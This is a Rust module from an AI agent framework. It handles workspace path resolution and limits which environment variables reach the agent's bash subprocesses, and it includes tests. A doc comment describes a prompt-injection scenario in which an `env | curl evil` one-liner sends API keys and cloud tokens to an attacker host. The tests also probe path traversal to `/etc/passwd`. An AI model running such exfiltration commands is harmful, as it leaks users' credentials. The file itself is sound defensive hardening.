//! Workspace root management and path normalization for sandboxed agent file access.

use std::path::{Component, Path, PathBuf};

use crate::error::Error;

/// An agent's home directory — a persistent location for notes, artifacts,
/// and intermediate results that survive context window limits.
///
/// The workspace is not a sandbox: the agent can still access the rest of
/// the filesystem. It's a *home base* where relative paths resolve to,
/// giving the agent a canonical place to organize its work.
#[derive(Debug, Clone)]
pub struct Workspace {
    root: PathBuf,
}

impl Workspace {
    /// Open (or create) a workspace at the given root directory.
    ///
    /// Creates the directory and all parents if they don't exist.
    pub fn open(root: impl Into<PathBuf>) -> Result<Self, Error> {
        let root = root.into();
        if !root.exists() {
            std::fs::create_dir_all(&root).map_err(|e| {
                Error::Config(format!(
                    "failed to create workspace at {}: {e}",
                    root.display()
                ))
            })?;
        }
        // Canonicalize to resolve symlinks and get an absolute path
        let root = root.canonicalize().map_err(|e| {
            Error::Config(format!(
                "failed to canonicalize workspace path {}: {e}",
                root.display()
            ))
        })?;
        Ok(Self { root })
    }

    /// The absolute path to the workspace root.
    pub fn root(&self) -> &Path {
        &self.root
    }

    /// Resolve a relative path against the workspace root.
    ///
    /// Returns `Err` if the resolved path escapes the workspace root
    /// (e.g., via `../..`). Absolute paths are returned as-is.
    pub fn resolve(&self, path: &str) -> Result<PathBuf, Error> {
        let p = Path::new(path);

        // Absolute paths pass through unchanged
        if p.is_absolute() {
            return Ok(p.to_path_buf());
        }

        // Reject path traversal that escapes the workspace
        let candidate = self.root.join(p);
        let normalized = normalize_path(&candidate);

        if !normalized.starts_with(&self.root) {
            return Err(Error::Agent(format!(
                "path '{}' escapes workspace root ({})",
                path,
                self.root.display()
            )));
        }

        Ok(normalized)
    }
}

/// Normalize a path by resolving `.` and `..` components without touching
/// the filesystem. This is needed because `canonicalize()` requires the
/// path to exist, but we want to resolve paths that don't exist yet.
pub fn normalize_path(path: &Path) -> PathBuf {
    let mut components = Vec::new();
    for component in path.components() {
        match component {
            Component::ParentDir => {
                // Pop the last normal component, but never go above root
                match components.last() {
                    Some(Component::Normal(_)) => {
                        components.pop();
                    }
                    _ => {
                        // At root or empty — can't go higher
                        components.push(component);
                    }
                }
            }
            Component::CurDir => {} // Skip `.`
            _ => components.push(component),
        }
    }
    components.iter().collect()
}

/// Controls which environment variables are visible to bash subprocesses.
///
/// **BREAKING CHANGE (F-FS-2)**: the default is now `Allowlist(DAEMON_ENV_ALLOWLIST)`.
/// Previously `Inherit` was the default — which passed all parent env vars
/// (including `ANTHROPIC_API_KEY`, `AWS_*`, `GITHUB_TOKEN`, etc.) into bash.
/// A single prompt-injection-driven `env | curl evil` call could exfiltrate
/// every secret. Use `EnvPolicy::Inherit` explicitly (and document why) if
/// you really want full inheritance.
#[derive(Debug, Clone)]
pub enum EnvPolicy {
    /// Inherit ALL env vars from the parent process. Dangerous when the agent
    /// can spawn shells under prompt-injection control. Opt-in only.
    Inherit,
    /// Only pass explicitly allowlisted env vars. **Default** — populated with
    /// [`DAEMON_ENV_ALLOWLIST`] which contains no secrets.
    Allowlist(Vec<String>),
}

impl Default for EnvPolicy {
    fn default() -> Self {
        Self::Allowlist(
            DAEMON_ENV_ALLOWLIST
                .iter()
                .map(|s| (*s).to_string())
                .collect(),
        )
    }
}

/// Safe default allowlist for daemon mode — no secrets, just system vars.
pub const DAEMON_ENV_ALLOWLIST: &[&str] = &[
    "PATH", "HOME", "USER", "LANG", "LC_ALL", "LC_CTYPE", "TZ", "TERM", "SHELL", "TMPDIR",
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn open_creates_directory() {
        let dir = tempfile::tempdir().unwrap();
        let ws_path = dir.path().join("new_workspace");
        assert!(!ws_path.exists());

        let ws = Workspace::open(&ws_path).unwrap();
        assert!(ws_path.exists());
        assert!(ws.root().is_absolute());
    }

    #[test]
    fn open_existing_directory() {
        let dir = tempfile::tempdir().unwrap();
        let ws = Workspace::open(dir.path()).unwrap();
        assert_eq!(ws.root(), dir.path().canonicalize().unwrap());
    }

    #[test]
    fn resolve_relative_path() {
        let dir = tempfile::tempdir().unwrap();
        let ws = Workspace::open(dir.path()).unwrap();

        let resolved = ws.resolve("notes.md").unwrap();
        assert_eq!(resolved, ws.root().join("notes.md"));
    }

    #[test]
    fn resolve_nested_relative_path() {
        let dir = tempfile::tempdir().unwrap();
        let ws = Workspace::open(dir.path()).unwrap();

        let resolved = ws.resolve("sub/dir/file.txt").unwrap();
        assert_eq!(resolved, ws.root().join("sub/dir/file.txt"));
    }

    #[test]
    fn resolve_absolute_path_passthrough() {
        let dir = tempfile::tempdir().unwrap();
        let ws = Workspace::open(dir.path()).unwrap();

        let resolved = ws.resolve("/etc/hosts").unwrap();
        assert_eq!(resolved, PathBuf::from("/etc/hosts"));
    }

    #[test]
    fn resolve_rejects_escape() {
        let dir = tempfile::tempdir().unwrap();
        let ws = Workspace::open(dir.path()).unwrap();

        let result = ws.resolve("../../etc/passwd");
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("escapes workspace root"), "got: {err}");
    }

    #[test]
    fn resolve_allows_internal_dotdot() {
        let dir = tempfile::tempdir().unwrap();
        let ws = Workspace::open(dir.path()).unwrap();

        // sub/../file.txt should resolve to workspace/file.txt (stays inside)
        let resolved = ws.resolve("sub/../file.txt").unwrap();
        assert_eq!(resolved, ws.root().join("file.txt"));
    }

    #[test]
    fn resolve_dot_path() {
        let dir = tempfile::tempdir().unwrap();
        let ws = Workspace::open(dir.path()).unwrap();

        let resolved = ws.resolve(".").unwrap();
        assert_eq!(resolved, ws.root().to_path_buf());
    }

    #[test]
    fn normalize_path_basic() {
        let path = Path::new("/a/b/../c/./d");
        assert_eq!(normalize_path(path), PathBuf::from("/a/c/d"));
    }

    #[test]
    fn normalize_path_no_escape_root() {
        let path = Path::new("/a/../../b");
        let normalized = normalize_path(path);
        // Should not go above root: /a/../../b -> /b
        assert!(normalized.starts_with("/"));
    }

    /// SECURITY (F-FS-2): the default MUST be Allowlist (no secrets) rather
    /// than Inherit. Previously the default was `Inherit`, which leaked
    /// `ANTHROPIC_API_KEY` / `AWS_*` / etc. to LLM-controlled bash sessions.
    #[test]
    fn env_policy_default_is_safe_allowlist() {
        match EnvPolicy::default() {
            EnvPolicy::Allowlist(list) => {
                assert!(list.contains(&"PATH".to_string()));
                // No KEY/TOKEN/SECRET names should be in the default.
                let suspicious: Vec<&String> = list
                    .iter()
                    .filter(|n| {
                        let u = n.to_ascii_uppercase();
                        u.contains("KEY") || u.contains("TOKEN") || u.contains("SECRET")
                    })
                    .collect();
                assert!(
                    suspicious.is_empty(),
                    "default allowlist must not contain secret-like names: {suspicious:?}"
                );
            }
            EnvPolicy::Inherit => panic!(
                "EnvPolicy::default() must NOT be Inherit (F-FS-2). \
                 Use EnvPolicy::Inherit explicitly if you really want it."
            ),
        }
    }

    #[test]
    fn daemon_env_allowlist_contains_path() {
        assert!(DAEMON_ENV_ALLOWLIST.contains(&"PATH"));
    }
}
